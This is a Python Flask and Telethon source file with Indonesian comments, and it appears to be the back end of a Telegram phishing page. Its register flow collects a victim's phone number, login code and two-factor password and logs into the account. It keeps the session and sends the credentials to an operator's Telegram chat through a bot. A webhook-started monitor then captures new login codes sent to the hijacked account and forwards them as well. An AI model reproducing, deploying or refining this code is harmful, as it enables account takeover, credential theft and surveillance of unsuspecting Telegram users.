import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# Ambil Variabel dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
# Variabel RAILWAY_STATIC_URL wajib ada di Dashboard Railway (tanpa https)
RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"

# Database RAM
user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=10)
        return res.json()
    except:
        return {}

def set_webhook():
    if os.getenv('RAILWAY_STATIC_URL'):
        webhook_url = f"{RAILWAY_URL}/webhook"
        bot_api("setWebhook", {"url": webhook_url})

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')
        
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor]['hash'] = res.phone_code_hash
            user_db[nomor]['session'] = client.session.save()
            return jsonify({"status": "success"})

        elif step == 2:
            try:
                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                # Laporan Pertama
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{data.get('otp')}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except: return jsonify({"status": "invalid_otp"}), 400

        elif step == 3:
            try:
                await client.sign_in(password=data.get('sandi'))
                user_db[nomor].update({"sandi": data.get('sandi'), "session": client.session.save()})
                # REQUEST: OTP tampil "None"
                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except: return jsonify({"status": "invalid_2fa"}), 400
    finally:
        if client:
            try:
                # Perbaikan: Cek koneksi sebelum disconnect agar tidak error
                if client.is_connected():
                    await client.disconnect()
            except: pass

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update or "callback_query" not in update: return jsonify({"status": "ok"})
    
    call = update["callback_query"]
    action, nomor = call["data"].split("_")
    
    if action == "upd":
        msg_text = "Bot siap mengintip OTP!\nSilakan minta kode di TurboTel/Telegraph Anda."
        res = bot_api("sendMessage", {
            "chat_id": CHAT_ID, 
            "text": msg_text,
            "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
        })
        user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
        # Jalankan Intip OTP di thread terpisah
        threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
        
    elif action == "exit":
        msg_id = user_db.get(nomor, {}).get('status_id')
        if msg_id:
            bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": msg_id})
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # KIRIM DATA LENGKAP KE BOT
                text_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown"})
                
                # Hapus instruksi 'Siap mengintip' otomatis
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                
                await client.disconnect()

        # Standby 10 menit (600 detik)
        await asyncio.sleep(600)
    finally:
        if client.is_connected():
            await client.disconnect()

if __name__ == "__main__":
    set_webhook()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
